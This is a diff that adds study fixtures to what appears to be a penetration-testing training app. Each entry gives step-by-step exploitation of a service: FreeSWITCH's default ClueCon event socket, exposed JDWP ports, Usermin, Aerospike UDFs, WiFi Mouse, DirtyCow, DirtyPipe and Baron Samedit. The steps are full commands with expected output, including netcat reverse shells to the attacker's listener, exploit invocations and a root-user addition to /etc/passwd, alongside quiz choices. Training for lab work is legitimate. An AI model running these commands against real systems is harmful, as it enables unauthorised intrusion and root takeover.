@@ -8034,6 +8034,738 @@
         "command-injection": "The injection is into a Java interpolation layer, not a shell metacharacter in app input.",
         "check-log4shell": "Log4Shell is JNDI in Log4j; these interpolations are Commons Text, a different library."
       }
+    },
+    "freeswitch-esl": {
+      "why": "FreeSWITCH is an open-source phone system, and its event socket on port 8021 is an administrative control channel. The problem is the default install: the password is ClueCon and there is frequently no access-control list, so any client that sends that password can drive the server, including running operating-system commands through its API. On a Windows host the FreeSWITCH service often runs with high privilege, so the shell can be powerful. Confirm the default password is accepted, then issue a system command.",
+      "cmd": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+      "tool": "nc",
+      "output": "+OK accepted\n+OK\nUP 0 years, 0 days, 1 hour, 2 minutes",
+      "signal": "+OK accepted",
+      "teach": "The socket accepted the default ClueCon password, so you can drive the API. The api system command runs OS commands; whoami shows the context, then stage a reverse shell.",
+      "leadup": [
+        {
+          "key": "auth",
+          "label": "The default password is accepted",
+          "steps": [
+            {
+              "title": "Send the default login",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+              "out": "+OK accepted\n+OK\nUP 0 years",
+              "sig": "+OK accepted",
+              "teach": "A default ClueCon login with no ACL is the whole vulnerability."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "The event socket is open",
+          "steps": [
+            {
+              "title": "See the open port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p8021 -sV {{target}}",
+              "out": "8021/tcp open  freeswitch-event",
+              "sig": "8021/tcp open",
+              "teach": "Port 8021 is the FreeSWITCH event socket; the default-password check comes next."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "FreeSWITCH ESL is confirm the default password, run whoami through the API, then stage a reverse shell with api system.",
+        "items": [
+          {
+            "t": "Confirm the default login",
+            "d": "Send auth ClueCon and an api status; a reply means the socket is open to you.",
+            "demo": [
+              {
+                "run": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+                "out": "+OK accepted",
+                "sig": "+OK accepted"
+              }
+            ],
+            "note": "No ACL plus the default password means the API is yours."
+          },
+          {
+            "t": "Check the execution context",
+            "d": "The api system command runs an OS command and returns its output.",
+            "demo": [
+              {
+                "run": "printf 'auth ClueCon\\n\\napi system whoami\\n\\n' | nc -nv {{target}} 8021",
+                "out": "+OK\nfreeswitch",
+                "sig": "freeswitch"
+              }
+            ],
+            "note": "On Windows this is often the high-privilege service account."
+          },
+          {
+            "t": "Stage a reverse shell",
+            "d": "Run a reverse-shell command through the API and catch it.",
+            "demo": [
+              {
+                "run": "python3 47799.py {{target}} 'nc {{lhost}} 4444 -e /bin/sh'",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the api system command runs it."
+          }
+        ]
+      },
+      "situation": "Port 8021 is open and sending the ClueCon password returns +OK accepted. What is the move?",
+      "choices": [
+        "freeswitch-esl",
+        "online-brute-ssh",
+        "recon-web-triage",
+        "content-discovery"
+      ],
+      "coach": {
+        "online-brute-ssh": "No brute needed; the default password is already accepted on the event socket.",
+        "recon-web-triage": "This is not a web app; it is the FreeSWITCH control socket, which runs OS commands directly.",
+        "content-discovery": "Nothing to discover on an HTTP server here; the socket itself is the exploit."
+      }
+    },
+    "jdwp-debug": {
+      "why": "The Java Debug Wire Protocol lets a developer attach a debugger to a running Java process and, among other things, invoke methods. Anyone who can reach the port can do the same, so an exposed JDWP port is code execution as the user running the JVM. These ports are often bound to localhost for local debugging, which means you usually reach them only after you have a foothold and can pivot. Confirm the port with the JDWP handshake, then a tool invokes your command inside the JVM.",
+      "cmd": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+      "tool": "nc",
+      "output": "JDWP-Handshake",
+      "signal": "JDWP-Handshake",
+      "teach": "The port echoed JDWP-Handshake, so it speaks the debug protocol. jdwp-shellifier will invoke a command in the JVM; if the port is localhost-only, reach it through a tunnel.",
+      "leadup": [
+        {
+          "key": "handshake",
+          "label": "The port speaks JDWP",
+          "steps": [
+            {
+              "title": "Send the handshake",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+              "out": "JDWP-Handshake",
+              "sig": "JDWP-Handshake",
+              "teach": "An echo of the handshake confirms a live debug port you can attach to."
+            }
+          ]
+        },
+        {
+          "key": "pivot",
+          "label": "The port is reachable, often via a pivot",
+          "steps": [
+            {
+              "title": "Reach a localhost-bound port through the tunnel",
+              "tool": "proxychains",
+              "where": "local",
+              "cmd": "proxychains nc -nv 127.0.0.1 8000",
+              "out": "127.0.0.1 8000 port [tcp/*] succeeded",
+              "sig": "8000 port",
+              "teach": "JDWP is commonly bound to localhost; a SOCKS pivot reaches it from your box."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "JDWP is confirm the handshake, clone jdwp-shellifier, then inject a command that runs as the JVM user.",
+        "items": [
+          {
+            "t": "Confirm the debug port",
+            "d": "Send the JDWP handshake; the server echoes it when the port speaks the protocol.",
+            "demo": [
+              {
+                "run": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+                "out": "JDWP-Handshake",
+                "sig": "JDWP-Handshake"
+              }
+            ],
+            "note": "No echo means it is not JDWP, or you cannot reach it yet."
+          },
+          {
+            "t": "Get the tool",
+            "d": "jdwp-shellifier attaches, sets a breakpoint, and invokes a command; it needs python2.",
+            "demo": [
+              {
+                "run": "git clone https://github.com/IOActive/jdwp-shellifier",
+                "out": "Cloning into 'jdwp-shellifier'...",
+                "sig": "jdwp-shellifier"
+              }
+            ],
+            "note": "Run it with python2, not python3."
+          },
+          {
+            "t": "Inject a command",
+            "d": "Point the tool at the port with your command; it runs inside the JVM as its user.",
+            "demo": [
+              {
+                "run": "python2 jdwp-shellifier.py -t {{target}} -p 8000 --cmd 'busybox nc {{lhost}} 4444 -e /bin/bash'",
+                "out": "[+] Command string object created id:9a0",
+                "sig": "Command string object created"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the JVM user."
+          }
+        ]
+      },
+      "situation": "A port returns the string JDWP-Handshake when you send the handshake. What is the move?",
+      "choices": [
+        "jdwp-debug",
+        "recon-web-triage",
+        "online-brute-ssh",
+        "sqli-basics"
+      ],
+      "coach": {
+        "recon-web-triage": "This is a debug protocol, not HTTP; attach to the JVM and invoke a method.",
+        "online-brute-ssh": "No credentials are involved; the debug port is open by definition.",
+        "sqli-basics": "No database input; the execution happens inside the Java process."
+      }
+    },
+    "usermin-rce": {
+      "why": "Usermin is the single-user sibling of Webmin, built on the same MiniServ server and usually on port 20000. Vulnerable versions up to 1.820 let an authenticated user run commands through a built-in module, so unlike the Webmin password-reset backdoor this one needs a valid login first. On these targets the login is almost always a credential you already recovered, often a username and password reused from anonymous FTP or a looted config file. Confirm Usermin, bring a login, then the proof of concept turns that login into a shell.",
+      "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+      "tool": "curl",
+      "output": "<title>Login to Usermin</title>",
+      "signal": "Usermin",
+      "teach": "Usermin is on 20000 and vulnerable at or below 1.820. With a valid login, usually a reused credential, the module RCE gives you a shell as that user.",
+      "leadup": [
+        {
+          "key": "present",
+          "label": "Usermin is confirmed on 20000",
+          "steps": [
+            {
+              "title": "Confirm the panel",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+              "out": "<title>Login to Usermin</title>",
+              "sig": "Usermin",
+              "teach": "Usermin on 20000 banners its login; read the version from the footer (vulnerable at or below 1.820)."
+            }
+          ]
+        },
+        {
+          "key": "creds",
+          "label": "You hold a reused credential",
+          "steps": [
+            {
+              "title": "Test a looted login",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -sk 'https://{{target}}:20000/session_login.cgi' --data 'user=bob&pass=Autumn2026!' -c c.txt -o /dev/null -w '%{http_code}\\n'",
+              "out": "302",
+              "sig": "302",
+              "teach": "A 302 redirect after login means the reused credential worked; a 200 back to the form means it failed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Usermin RCE is confirm the version on 20000, get a valid login, then run the PoC with those creds.",
+        "items": [
+          {
+            "t": "Confirm Usermin and the version",
+            "d": "Banner the login page and read the version; vulnerable at or below 1.820.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+                "out": "<title>Login to Usermin</title>",
+                "sig": "Usermin"
+              }
+            ],
+            "note": "A newer build patched the module RCE, so the version matters."
+          },
+          {
+            "t": "Bring a valid login",
+            "d": "The RCE is authenticated, so you need working creds, usually a reused pair you looted elsewhere.",
+            "demo": [
+              {
+                "run": "curl -sk 'https://{{target}}:20000/session_login.cgi' --data 'user=bob&pass=Autumn2026!' -c c.txt -o /dev/null -w '%{http_code}\\n'",
+                "out": "302",
+                "sig": "302"
+              }
+            ],
+            "note": "A 302 means the login worked; a 200 back to the form means it did not."
+          },
+          {
+            "t": "Run the exploit",
+            "d": "Feed the working credential to the PoC with your listener details.",
+            "demo": [
+              {
+                "run": "python3 50234.py --host {{target}} --login bob --password 'Autumn2026!' --reverse-ip {{lhost}} --reverse-port 4444",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the Usermin user."
+          }
+        ]
+      },
+      "situation": "Usermin answers on 20000 at version 1.820 and you recovered a working login from a config file. What is the move?",
+      "choices": [
+        "usermin-rce",
+        "webmin-rce",
+        "online-brute-rdp",
+        "content-discovery"
+      ],
+      "coach": {
+        "webmin-rce": "That is the unauthenticated Webmin path on 10000; Usermin on 20000 needs a login, which you have.",
+        "online-brute-rdp": "Wrong service; you already hold a valid Usermin credential, so use the authenticated RCE.",
+        "content-discovery": "The service and version are known and you have creds; run the exploit."
+      }
+    },
+    "aerospike-udf": {
+      "why": "Aerospike is a fast key-value database, and versions up to 5.1.0.6 let an unauthenticated client register a user-defined function written in Lua. Those UDFs can call out to the operating system, so registering a malicious one and invoking it runs commands as the aerospike service user. The database listens on ports 3000 to 3003, and you often spot it because a web application names Aerospike as its backend. Reach the port, run the public proof of concept to register and fire the UDF, and catch a shell.",
+      "cmd": "nc -nv {{target}} 3000",
+      "tool": "nc",
+      "output": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
+      "signal": "3000 port",
+      "teach": "Aerospike is reachable on 3000. If it is at or below 5.1.0.6, register a Lua UDF that runs a command, invoke it, and you have a shell as the aerospike user.",
+      "leadup": [
+        {
+          "key": "reachable",
+          "label": "The database port answers",
+          "steps": [
+            {
+              "title": "Touch the Aerospike port",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "nc -nv {{target}} 3000",
+              "out": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
+              "sig": "3000 port",
+              "teach": "Aerospike uses 3000 to 3003; the info protocol answers there."
+            }
+          ]
+        },
+        {
+          "key": "backend",
+          "label": "A web app names Aerospike",
+          "steps": [
+            {
+              "title": "Spot the backend fingerprint",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://{{target}}/ | grep -i aerospike",
+              "out": "<!-- backend: aerospike cluster -->",
+              "sig": "aerospike",
+              "teach": "The app often names its database; that fingerprint points you at the 3000 service."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Aerospike UDF is confirm the service, clone the PoC, then register and invoke a Lua UDF that runs your command.",
+        "items": [
+          {
+            "t": "Confirm the service",
+            "d": "The Aerospike info protocol answers on 3000 to 3003.",
+            "demo": [
+              {
+                "run": "nc -nv {{target}} 3000",
+                "out": "Connection to {{target}} 3000 port [tcp/*] succeeded!",
+                "sig": "3000 port"
+              }
+            ],
+            "note": "A web app that names Aerospike as a backend is the usual way you find it."
+          },
+          {
+            "t": "Get the PoC",
+            "d": "The public exploit registers a Lua UDF that executes a command.",
+            "demo": [
+              {
+                "run": "git clone https://github.com/b4ny4n/CVE-2020-13151",
+                "out": "Cloning into 'CVE-2020-13151'...",
+                "sig": "CVE-2020-13151"
+              }
+            ],
+            "note": "Vulnerable at or below Aerospike 5.1.0.6."
+          },
+          {
+            "t": "Register and fire the UDF",
+            "d": "Run the exploit with your listener; it registers the UDF and invokes it.",
+            "demo": [
+              {
+                "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport 4444 --command rev",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the UDF runs as the aerospike user."
+          }
+        ]
+      },
+      "situation": "A web app names Aerospike as its backend and port 3000 is open. What is the move?",
+      "choices": [
+        "aerospike-udf",
+        "mongo-enum",
+        "redis-enum",
+        "sqli-basics"
+      ],
+      "coach": {
+        "mongo-enum": "Wrong database; this is Aerospike on 3000 with a Lua UDF code-execution path.",
+        "redis-enum": "Redis is 6379; Aerospike's UDF registration is the execution primitive here.",
+        "sqli-basics": "The execution is through a registered UDF, not a SQL injection in the app."
+      }
+    },
+    "wifi-mouse-rce": {
+      "why": "WiFi Mouse is an app that turns a phone into a mouse and keyboard for a desktop, and its Mouse Server listens on port 1978. The flaw is that it checks whether the client is the official app entirely on the client side, which an attacker simply ignores. So file-execution events can be sent to the server with no authentication, and they run a program as the logged-in desktop user. Confirm the port is the Mouse Server, then the public proof of concept drops and runs a reverse shell.",
+      "cmd": "nc -nv {{target}} 1978",
+      "tool": "nc",
+      "output": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
+      "signal": "1978 port",
+      "teach": "The Mouse Server is answering on 1978. Its auth is client-side only, so the PoC sends unauthenticated file-exec events to run a reverse shell as the desktop user.",
+      "leadup": [
+        {
+          "key": "port",
+          "label": "The Mouse Server port answers",
+          "steps": [
+            {
+              "title": "Touch the control port",
+              "tool": "nc",
+              "where": "local",
+              "cmd": "nc -nv {{target}} 1978",
+              "out": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
+              "sig": "1978 port",
+              "teach": "The control port answering confirms the target app is present."
+            }
+          ]
+        },
+        {
+          "key": "banner",
+          "label": "nmap flags the port",
+          "steps": [
+            {
+              "title": "Scan the port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p1978 -sV {{target}}",
+              "out": "1978/tcp open  unknown",
+              "sig": "1978/tcp open",
+              "teach": "An open 1978 with a desktop-control app behind it is the WiFi Mouse server."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "WiFi Mouse RCE is confirm the Mouse Server on 1978, then run the PoC that sends unauthenticated file-exec events.",
+        "items": [
+          {
+            "t": "Confirm the port",
+            "d": "The Mouse Server answering on 1978 is enough; there is no login to get past.",
+            "demo": [
+              {
+                "run": "nc -nv {{target}} 1978",
+                "out": "Connection to {{target}} 1978 port [tcp/*] succeeded!",
+                "sig": "1978 port"
+              }
+            ],
+            "note": "Authentication is entirely client-side, so the server trusts you."
+          },
+          {
+            "t": "Run the exploit",
+            "d": "The PoC sends the file-execution events that drop and run a reverse shell.",
+            "demo": [
+              {
+                "run": "python3 50972.py {{target}} {{lhost}} 4444",
+                "out": "(no body; check your listener)",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Start nc -lvnp 4444 first; the shell is the logged-in desktop user."
+          }
+        ]
+      },
+      "situation": "Port 1978 is open and belongs to the WiFi Mouse Mouse Server. What is the move?",
+      "choices": [
+        "wifi-mouse-rce",
+        "online-brute-rdp",
+        "recon-vnc",
+        "content-discovery"
+      ],
+      "coach": {
+        "online-brute-rdp": "No login exists to brute; the server trusts the client, so execution is unauthenticated.",
+        "recon-vnc": "Wrong remote-desktop service; this is the WiFi Mouse control port with a code-execution bug.",
+        "content-discovery": "Not a web server; the Mouse Server protocol itself carries the exploit."
+      }
+    },
+    "dirtycow": {
+      "why": "DirtyCow is a race condition in how the Linux kernel handles copy-on-write memory, present on kernels below 4.8.3. By racing two operations you can write to a file you should only be able to read, and the classic payloads either add a root line to /etc/passwd or overwrite a SUID binary, both ending at root. It is a post-foothold local escalation you reach for when the misconfiguration paths are exhausted, and it can be unstable, so snapshot the box if the environment allows. Check the kernel, compile the staged exploit on the target, and run it.",
+      "cmd": "uname -r",
+      "tool": "cmd",
+      "output": "4.4.0-116-generic",
+      "signal": "4.4.0",
+      "teach": "The kernel is 4.4.0, below the 4.8.3 fix, so DirtyCow applies. Compile the /etc/passwd variant on the target and run it, then su to the new root user.",
+      "leadup": [
+        {
+          "key": "kernel",
+          "label": "The kernel is below 4.8.3",
+          "steps": [
+            {
+              "title": "Read the kernel version",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "uname -r",
+              "out": "4.4.0-116-generic",
+              "sig": "4.4.0",
+              "teach": "Below 4.8.3 is vulnerable; newer kernels are patched."
+            }
+          ]
+        },
+        {
+          "key": "shell",
+          "label": "You have a Linux foothold",
+          "steps": [
+            {
+              "title": "Confirm your unprivileged shell",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "DirtyCow is a local escalation, so you need a shell on the box first."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "DirtyCow is confirm the kernel is below 4.8.3, compile the staged PoC on the target, run it, then take root.",
+        "items": [
+          {
+            "t": "Check the kernel",
+            "d": "uname -r names the kernel; DirtyCow is reliable only below 4.8.3.",
+            "demo": [
+              {
+                "run": "uname -r",
+                "out": "4.4.0-116-generic",
+                "sig": "4.4.0"
+              }
+            ],
+            "note": "Newer kernels are patched; do not risk the unstable race for nothing."
+          },
+          {
+            "t": "Compile on the target",
+            "d": "Build the staged exploit with a C compiler on the box, or compile for the same architecture and transfer it.",
+            "demo": [
+              {
+                "run": "gcc -pthread dirtycow.c -o /tmp/dcow -lcrypt",
+                "out": "dirtycow.c compiled to /tmp/dcow",
+                "sig": "/tmp/dcow"
+              }
+            ],
+            "note": "The passwd variant and the SUID variant both reach root; pick whichever the box supports."
+          },
+          {
+            "t": "Run it and take root",
+            "d": "Run the exploit; the passwd variant adds a root user you then switch to.",
+            "demo": [
+              {
+                "run": "/tmp/dcow",
+                "out": "Backing up /etc/passwd to /tmp/passwd.bak\nAdded root user firefart",
+                "sig": "firefart"
+              }
+            ],
+            "note": "su firefart with the password it set; then capture proof."
+          }
+        ]
+      },
+      "situation": "You have a shell on a Linux box and uname -r shows 4.4.0-116-generic. What is the move?",
+      "choices": [
+        "dirtycow",
+        "linux-kernel-exploit",
+        "sudo-abuse",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "linux-kernel-exploit": "That is the general approach; here the exact kernel points at DirtyCow specifically.",
+        "sudo-abuse": "Worth checking, but a kernel below 4.8.3 is a direct DirtyCow candidate when sudo gives you nothing.",
+        "suid-gtfobins": "A SUID path is a fine parallel lead; the kernel version makes DirtyCow the named exploit."
+      }
+    },
+    "dirtypipe": {
+      "why": "DirtyPipe is a Linux kernel bug on versions 5.8 through 5.16.11 that lets an unprivileged user write into the page cache of a file they can only read, including read-only and SUID binaries. The reliable payload overwrites a SUID binary like su with a tiny stub that drops a root shell, then restores the original. It is more stable than DirtyCow and is a post-foothold local escalation. Confirm the kernel version, compile the staged exploit on the target, and point it at a SUID binary.",
+      "cmd": "uname -r",
+      "tool": "cmd",
+      "output": "5.10.0-11-amd64",
+      "signal": "5.10.0",
+      "teach": "The kernel is 5.10.0, inside the 5.8 to 5.16.11 range, so DirtyPipe applies. Compile the exploit and point it at a SUID binary like /usr/bin/su for a root shell.",
+      "leadup": [
+        {
+          "key": "kernel",
+          "label": "The kernel is 5.8 to 5.16.11",
+          "steps": [
+            {
+              "title": "Read the kernel version",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "uname -r",
+              "out": "5.10.0-11-amd64",
+              "sig": "5.10.0",
+              "teach": "The vulnerable window is 5.8 through 5.16.11."
+            }
+          ]
+        },
+        {
+          "key": "shell",
+          "label": "You have a Linux foothold",
+          "steps": [
+            {
+              "title": "Confirm your unprivileged shell",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "DirtyPipe is a local escalation, so a foothold comes first."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "DirtyPipe is confirm the kernel is 5.8 to 5.16.11, compile the PoC, point it at a SUID binary, take root.",
+        "items": [
+          {
+            "t": "Check the kernel",
+            "d": "uname -r names the kernel; DirtyPipe applies from 5.8 through 5.16.11.",
+            "demo": [
+              {
+                "run": "uname -r",
+                "out": "5.10.0-11-amd64",
+                "sig": "5.10.0"
+              }
+            ],
+            "note": "Outside that range DirtyPipe does not apply."
+          },
+          {
+            "t": "Compile on the target",
+            "d": "Build the staged exploit on the box, or compile for the same architecture and transfer it.",
+            "demo": [
+              {
+                "run": "gcc dirtypipe.c -o /tmp/dp",
+                "out": "dirtypipe.c compiled to /tmp/dp",
+                "sig": "/tmp/dp"
+              }
+            ],
+            "note": "No warnings needed; the exploit is small and self-contained."
+          },
+          {
+            "t": "Hijack a SUID binary",
+            "d": "Point the exploit at a SUID binary; it rewrites it, drops you to root, and restores it.",
+            "demo": [
+              {
+                "run": "/tmp/dp /usr/bin/su",
+                "out": "Backing up /usr/bin/su, restoring after\nroot@box:/#",
+                "sig": "root@box"
+              }
+            ],
+            "note": "The original binary is restored afterwards, so the box keeps working."
+          }
+        ]
+      },
+      "situation": "You have a shell on Linux and uname -r shows 5.10.0-11-amd64. What is the move?",
+      "choices": [
+        "dirtypipe",
+        "dirtycow",
+        "linux-kernel-exploit",
+        "cron-abuse"
+      ],
+      "coach": {
+        "dirtycow": "DirtyCow is for kernels below 4.8.3; 5.10 is in the DirtyPipe window instead.",
+        "linux-kernel-exploit": "That is the general method; the exact version points at DirtyPipe.",
+        "cron-abuse": "A cron path is a fine parallel lead; the kernel version makes DirtyPipe the direct exploit."
+      }
+    },
+    "baron-samedit": {
+      "why": "Baron Samedit is a heap overflow inside sudo itself, present on sudo below 1.9.5p2. It is reached through sudoedit before sudo checks whether you are allowed to run anything, so any local user can trigger it regardless of their sudo rights, even a user who sudo -l says can do nothing. A public exploit auto-detects the memory layout for the target and spawns a root shell. It is a post-foothold escalation and a reliable fallback when the obvious sudo and SUID paths are closed. Confirm the sudo version, then run the exploit.",
+      "cmd": "sudo --version | head -1",
+      "tool": "cmd",
+      "output": "Sudo version 1.8.31",
+      "signal": "1.8.31",
+      "teach": "sudo is 1.8.31, below the 1.9.5p2 fix, so Baron Samedit applies. Run the exploit; it needs no sudo rights of your own and auto-detects the offsets.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "sudo is below 1.9.5p2",
+          "steps": [
+            {
+              "title": "Read the sudo version",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sudo --version | head -1",
+              "out": "Sudo version 1.8.31",
+              "sig": "1.8.31",
+              "teach": "Below 1.9.5p2 is vulnerable, and your own sudo rights do not matter."
+            }
+          ]
+        },
+        {
+          "key": "crash",
+          "label": "A crash test confirms it",
+          "steps": [
+            {
+              "title": "Trigger the overflow safely",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sudoedit -s '' $(perl -e 'print \"A\" x 1000')",
+              "out": "malloc(): corrupted top size\nSegmentation fault",
+              "sig": "Segmentation fault",
+              "teach": "A crash from the overflow test confirms the vulnerable code path before you run the full exploit."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Baron Samedit is confirm sudo is below 1.9.5p2, clone the exploit, run it, and take the root shell it spawns.",
+        "items": [
+          {
+            "t": "Check the sudo version",
+            "d": "sudo --version reports the version; below 1.9.5p2 is vulnerable.",
+            "demo": [
+              {
+                "run": "sudo --version | head -1",
+                "out": "Sudo version 1.8.31",
+                "sig": "1.8.31"
+              }
+            ],
+            "note": "Your own sudo rights do not matter; the bug is reached before the permission check."
+          },
+          {
+            "t": "Get the exploit",
+            "d": "The worawit version auto-detects the right offsets for common targets.",
+            "demo": [
+              {
+                "run": "git clone https://github.com/worawit/CVE-2021-3156",
+                "out": "Cloning into 'CVE-2021-3156'...",
+                "sig": "CVE-2021-3156"
+              }
+            ],
+            "note": "Other PoCs need the exact libc or distro offsets, which is more fragile."
+          },
+          {
+            "t": "Run it and take root",
+            "d": "Run the exploit; it spawns a root shell directly.",
+            "demo": [
+              {
+                "run": "python3 CVE-2021-3156/exploit_nss.py",
+                "out": "# id\nuid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Capture proof; the shell is root with no password prompt."
+          }
+        ]
+      },
+      "situation": "You have a shell on Linux, sudo -l shows nothing useful, and sudo --version reports 1.8.31. What is the move?",
+      "choices": [
+        "baron-samedit",
+        "sudo-abuse",
+        "dirtypipe",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "sudo-abuse": "sudo -l gave you nothing, but Baron Samedit does not need any sudo rights; the version alone is the lever.",
+        "dirtypipe": "A kernel path is a parallel option; the sudo version here points straight at Baron Samedit.",
+        "suid-gtfobins": "Worth a look, but the vulnerable sudo is a direct root with no special SUID binary needed."
+      }
     }
   };
   Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
